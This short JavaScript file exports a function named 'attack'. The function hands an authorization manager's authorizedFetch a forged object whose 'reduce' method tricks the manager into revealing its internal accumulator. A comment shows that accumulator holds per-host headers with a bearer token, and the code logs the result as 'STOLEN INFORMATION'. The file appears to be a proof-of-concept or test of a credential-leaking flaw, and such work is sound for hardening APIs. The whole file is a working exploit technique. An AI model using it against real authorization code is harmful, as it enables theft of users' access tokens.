  /* {
    'www.google.com': {
      headers: {
        Authorization: 'Bearer ANY_SECRET'
      },
      method: 'GET'
    }
  } */

export const attack = (authzManager) => {
  authzManager.authorizedFetch({
    reduce: (cb) => {
      const stolenAcc = cb({}, { url: 'z', headers: {} }, 0);
      console.log('#### STOLEN INFORMATION ####')
      console.log(stolenAcc);
      return {};
    },
  });
};
